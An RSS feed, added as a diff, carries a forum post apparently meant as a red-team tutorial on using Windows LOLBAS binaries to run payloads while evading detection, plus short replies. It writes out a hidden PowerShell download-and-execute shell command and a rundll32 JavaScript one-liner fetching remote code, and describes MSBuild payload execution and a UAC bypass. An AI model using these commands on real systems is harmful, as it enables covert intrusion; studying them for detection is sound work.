@@ -1,0 +1,200 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Execution (LOLBAS)</title>
+    <link>https://0x00sec.org/t/execution-lolbas/21922</link>
+    <description># Execution
+
+In my previous post I talked about capturing hashes using a variety of different methods if you noticed these methods were utilizing LOLBAS also know as ***Living Off The Land Binaries and Scripts (and also Libraries)*** but what are these Executable that I utilized???. They are Windows Trusted Binaries that come installed into the System already, by living off the Land we utilize trusted binaries from Windows to execute our Malicious Binaries, in my [Gitbook](https://dmcxblue.gitbook.io/red-team-notes/execution) I was explained why these are utilized by APT (Advanced Persistent Threats) some of the reasons given were:
+
+* Avoid creating new processes/network connections
+* Avoid creating anomalous parent/child relationships
+* Avoid creating/modifying files/registry entries
+* Avoid creating memory anomalies
+* Avoid leaving evidence in log files
+
+Why is this good?, well let me show you an Example if we execute a malicious binary or command that calls back to our attacking machine what does the Blue Team see??, Well if we use some of the tools available (SysInternals) this is a great way to view what is going on.
+
+Let’s catch a Shell using a PowerShell Script.
+
+```
+powershell.exe -W 1 -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.0.2.15:8000/Connect-BDTcp.ps1&#39;);
+```
+
+![](upload://caqsC5CFWSlJJWHb3YFoh6BaoTt.png)
+
+Shell
+
+I used this command because I am telling power shell that I want the Window-Style as Hidden so when executed it is not shown (“Obviously!!”) on the Victim machine.
+
+![](upload://ecKErrx4YDloNZ7IS4vh8isG4L.png)
+
+No Window!!
+
+But here comes in Sysinternals, Process Explorer what can we see with this Marvelous Tool.
+
+Uh Oh, nothing good an obvious PowerShell execution, with a Network Connection being established.
+
+![](upload://x58dLucoIXO8NSxramjRdpsj0Cl.png)
+
+![](upload://znk3LRkfeB2vZPKqlhyb9TFVG3c.png)
+
+Not good this will get caught Immediately, Poor Opsec and very obvious to a tool for monitoring, we have to make this a little more difficult to catch, here come’s LOLBAS.
+
+For the sake of Demonstration I will use RunDLL to call the same PowerShell Script and Execute. In the following example it combines with JavaScript so it can execute powershell and call the script remotely usually rundll32 will execute DLL files but this can be combined to execute commands as well.
+
+```
+rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip:port/&#39;);&quot;)
+```
+
+Here we go, a little better since rundll32 is a legit process sometimes it’s nothing to worry about. But…
+
+![](upload://t7FQZ5R7FaWfSxBUgIxCD3Ich0m.png)
+
+What is this Command Line Syntax being used!!!.
+
+![](upload://go04y0mEDqZbvVu7UFBJfRTkQX8.png)
+
+Yes we manage to avoid the creation of a Child Process, and it doesn’t show a Network Connection.
+
+![](upload://3D7Wqj5ZFbUwBGLLHM0FoRJ47hQ.png)
+
+But we have that Syntax that can give us away, at least you get the idea we hid ourselves properly this time by using a legitimate Windows binary to execute our malicious payload.
+
+OK let’s continue, now that we know a little into why these are used let’s show another example on what they can be used for as well, let’s imagine we have initial access in one of our engagements but this environment is well aware of what is going on with hacking, blacklisted known extensions and it’s very restricted on what can be executed our primary suspects here are “EXE, DLL, HTA, SCR” these files are known for executing malicious malware so here LOLBAS enters again, in this example we have access in a Developer machine, Visual Studio is installed (You know where this is going) and MSBuild is available.
+
+***MSbuild: Microsoft Build Engine is a software build platform used by Visual Studio. it takes XML formatted project files. Adversaries can use MSBuild to proxy execution of code through a trusted windows utility. The inline task allows for C# code to be inserted in the XML project to compile and execute the arbitrary code.***
+
+In this example we hold a small shell and we are trying to upgrade into our C2, and we only have MSBuild available to execute we upload our XML payload to the victim machine and utilize MSBuild to execute.
+
+https://vimeo.com/432322419
+MSBuild Example
+
+Great we got a shell proxy executing with MSBuild using an XML file with C# code inserted so it may compile and execute.
+
+Finally our last example, we know how to execute files, evade logs, and the creation of child processes and the use of trusted binaries to execute our malware. Now let me demonstrate an example on UAC Bypass and Privesc with one of these trusted binaries
+
+I enumerated the Machine and it contains a privilege escalation vulnerability named “Always Install Elevated” (more info [here](https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path)). I upload an MSI Malware and try to execute but what happens??.
+
+![](upload://52Es5ReMWFAduG2xGrNCiKXZ7Za.png)
+
+No Shell
+
+But why?, I got back to the Machine and I see this.
+
+![](upload://bKadBTIBcODf9aVNH0u9DOqV8oc.png)
+
+UAC
+
+Good old UAC, a feature implemented in Windows Vista, and Windows Server 2008, a more relaxed version on 7 and newer. Here come’s windows signed binaries again with these we can Bypass UAC, usually these binaries run with more elevated permissions or because Windows Trusts these to be executed (Now they are more monitored). But let’s see the Bypass in action.
+
+https://vimeo.com/432336491
+
+We worked with a few well known examples with windows signed binaries they are helpful for Executions and Bypasses these are few examples on what can be done with these Binaries you are more than welcome to review them [here](https://lolbas-project.github.io/#) and in my [Gitbook](https://dmcxblue.gitbook.io/red-team-notes/execution). It will go more into detail and have various examples on what other things can be done.</description>
+    
+    <lastBuildDate>Thu, 25 Jun 2020 01:50:41 +0000</lastBuildDate>
+    <category>Red-Team</category>
+    <atom:link href="https://0x00sec.org/t/execution-lolbas/21922.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Execution (LOLBAS)</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/execution-lolbas/21922/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/execution-lolbas/21922/4</link>
+        <pubDate>Sat, 24 Oct 2020 16:07:17 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-21922-4</guid>
+        <source url="https://0x00sec.org/t/execution-lolbas/21922.rss">Execution (LOLBAS)</source>
+      </item>
+      <item>
+        <title>Execution (LOLBAS)</title>
+        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
+        <description><![CDATA[
+            <p>Thank You, I try my best to help people that are trying to jump into this awesome field.</p>
+          <p><a href="https://0x00sec.org/t/execution-lolbas/21922/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/execution-lolbas/21922/3</link>
+        <pubDate>Thu, 25 Jun 2020 01:50:41 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-21922-3</guid>
+        <source url="https://0x00sec.org/t/execution-lolbas/21922.rss">Execution (LOLBAS)</source>
+      </item>
+      <item>
+        <title>Execution (LOLBAS)</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>Wow man.</p>
+<p>This is a fantastic article and I love the writing style. It’s really well written and I enjoy that you have formalized a lot of my thoughts on it, and how it has evolved as detection has gotten more advanced.</p>
+<p>LOLBAS/LOLBINS are dope and a fundamental feature in pretty much every OS/Software package that exists.</p>
+<p>EDIT: I love the videos, the screenshots and the visual nature of it is really kick-ass. Shows how much effort has gone into the writing!</p>
+          <p><a href="https://0x00sec.org/t/execution-lolbas/21922/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/execution-lolbas/21922/2</link>
+        <pubDate>Thu, 25 Jun 2020 00:17:34 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-21922-2</guid>
+        <source url="https://0x00sec.org/t/execution-lolbas/21922.rss">Execution (LOLBAS)</source>
+      </item>
+      <item>
+        <title>Execution (LOLBAS)</title>
+        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
+        <description><![CDATA[
+            <h1>Execution</h1>
+<p>In my previous post I talked about capturing hashes using a variety of different methods if you noticed these methods were utilizing LOLBAS also know as <em><strong>Living Off The Land Binaries and Scripts (and also Libraries)</strong></em> but what are these Executable that I utilized???. They are Windows Trusted Binaries that come installed into the System already, by living off the Land we utilize trusted binaries from Windows to execute our Malicious Binaries, in my <a href="https://dmcxblue.gitbook.io/red-team-notes/execution" rel="noopener nofollow ugc">Gitbook</a> I was explained why these are utilized by APT (Advanced Persistent Threats) some of the reasons given were:</p>
+<ul>
+<li>Avoid creating new processes/network connections</li>
+<li>Avoid creating anomalous parent/child relationships</li>
+<li>Avoid creating/modifying files/registry entries</li>
+<li>Avoid creating memory anomalies</li>
+<li>Avoid leaving evidence in log files</li>
+</ul>
+<p>Why is this good?, well let me show you an Example if we execute a malicious binary or command that calls back to our attacking machine what does the Blue Team see??, Well if we use some of the tools available (SysInternals) this is a great way to view what is going on.</p>
+<p>Let’s catch a Shell using a PowerShell Script.</p>
+<pre><code class="lang-auto">powershell.exe -W 1 -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.15:8000/Connect-BDTcp.ps1');
+</code></pre>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5547d2440777145e5788b06f5726baeedab5824f.png" alt="" data-base62-sha1="caqsC5CFWSlJJWHb3YFoh6BaoTt" width="" height=""></p>
+<p>Shell</p>
+<p>I used this command because I am telling power shell that I want the Window-Style as Hidden so when executed it is not shown (“Obviously!!”) on the Victim machine.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/019b1695cd98d5829a6e1c5b1fb32bc315416fcf.png" alt="" data-base62-sha1="ecKErrx4YDloNZ7IS4vh8isG4L" width="" height=""></p>
+<p>No Window!!</p>
+<p>But here comes in Sysinternals, Process Explorer what can we see with this Marvelous Tool.</p>
+<p>Uh Oh, nothing good an obvious PowerShell execution, with a Network Connection being established.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e7dc45208463b02d45f1cd1f2733d717c6bd2411.png" alt="" data-base62-sha1="x58dLucoIXO8NSxramjRdpsj0Cl" width="" height=""></p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f7ef086c7411b9e1ca9f83b0ef77b44683846116.png" alt="" data-base62-sha1="znk3LRkfeB2vZPKqlhyb9TFVG3c" width="" height=""></p>
+<p>Not good this will get caught Immediately, Poor Opsec and very obvious to a tool for monitoring, we have to make this a little more difficult to catch, here come’s LOLBAS.</p>
+<p>For the sake of Demonstration I will use RunDLL to call the same PowerShell Script and Execute. In the following example it combines with JavaScript so it can execute powershell and call the script remotely usually rundll32 will execute DLL files but this can be combined to execute commands as well.</p>
+<pre><code class="lang-auto">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")
+</code></pre>
+<p>Here we go, a little better since rundll32 is a legit process sometimes it’s nothing to worry about. But…</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cc1d260bff3f54fde38d827433065ba7cc4f411a.png" alt="" data-base62-sha1="t7FQZ5R7FaWfSxBUgIxCD3Ich0m" width="" height=""></p>
+<p>What is this Command Line Syntax being used!!!.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/72d95631f248d6ae7d7e5edaf615392794ca4792.png" alt="" data-base62-sha1="go04y0mEDqZbvVu7UFBJfRTkQX8" width="" height=""></p>
+<p>Yes we manage to avoid the creation of a Child Process, and it doesn’t show a Network Connection.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1972d27fe8b243678be3062d39c488d15f2556fe.png" alt="" data-base62-sha1="3D7Wqj5ZFbUwBGLLHM0FoRJ47hQ" width="" height=""></p>
+<p>But we have that Syntax that can give us away, at least you get the idea we hid ourselves properly this time by using a legitimate Windows binary to execute our malicious payload.</p>
+<p>OK let’s continue, now that we know a little into why these are used let’s show another example on what they can be used for as well, let’s imagine we have initial access in one of our engagements but this environment is well aware of what is going on with hacking, blacklisted known extensions and it’s very restricted on what can be executed our primary suspects here are “EXE, DLL, HTA, SCR” these files are known for executing malicious malware so here LOLBAS enters again, in this example we have access in a Developer machine, Visual Studio is installed (You know where this is going) and MSBuild is available.</p>
+<p><em><strong>MSbuild: Microsoft Build Engine is a software build platform used by Visual Studio. it takes XML formatted project files. Adversaries can use MSBuild to proxy execution of code through a trusted windows utility. The inline task allows for C# code to be inserted in the XML project to compile and execute the arbitrary code.</strong></em></p>
+<p>In this example we hold a small shell and we are trying to upgrade into our C2, and we only have MSBuild available to execute we upload our XML payload to the victim machine and utilize MSBuild to execute.</p>
+<p>          <p><a href="https://vimeo.com/432322419">https://vimeo.com/432322419</a></p>
+<br>
+MSBuild Example</p>
+<p>Great we got a shell proxy executing with MSBuild using an XML file with C# code inserted so it may compile and execute.</p>
+<p>Finally our last example, we know how to execute files, evade logs, and the creation of child processes and the use of trusted binaries to execute our malware. Now let me demonstrate an example on UAC Bypass and Privesc with one of these trusted binaries</p>
+<p>I enumerated the Machine and it contains a privilege escalation vulnerability named “Always Install Elevated” (more info <a href="https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path" rel="noopener nofollow ugc">here</a>). I upload an MSI Malware and try to execute but what happens??.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2357a0b6c18e4c13b6e0da40baa5d2009d63f774.png" alt="" data-base62-sha1="52Es5ReMWFAduG2xGrNCiKXZ7Za" width="" height=""></p>
+<p>No Shell</p>
+<p>But why?, I got back to the Machine and I see this.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/524fd84ce91be874a78a984a90d9b0b17d98d1d4.png" alt="" data-base62-sha1="bKadBTIBcODf9aVNH0u9DOqV8oc" width="" height=""></p>
+<p>UAC</p>
+<p>Good old UAC, a feature implemented in Windows Vista, and Windows Server 2008, a more relaxed version on 7 and newer. Here come’s windows signed binaries again with these we can Bypass UAC, usually these binaries run with more elevated permissions or because Windows Trusts these to be executed (Now they are more monitored). But let’s see the Bypass in action.</p>
+<p>          <p><a href="https://vimeo.com/432336491">https://vimeo.com/432336491</a></p>
+</p>
+<p>We worked with a few well known examples with windows signed binaries they are helpful for Executions and Bypasses these are few examples on what can be done with these Binaries you are more than welcome to review them <a href="https://lolbas-project.github.io/#" rel="noopener nofollow ugc">here</a> and in my <a href="https://dmcxblue.gitbook.io/red-team-notes/execution" rel="noopener nofollow ugc">Gitbook</a>. It will go more into detail and have various examples on what other things can be done.</p>
+          <p><a href="https://0x00sec.org/t/execution-lolbas/21922/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/execution-lolbas/21922/1</link>
+        <pubDate>Thu, 25 Jun 2020 00:00:31 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-21922-1</guid>
+        <source url="https://0x00sec.org/t/execution-lolbas/21922.rss">Execution (LOLBAS)</source>
+      </item>
+  </channel>
+</rss>
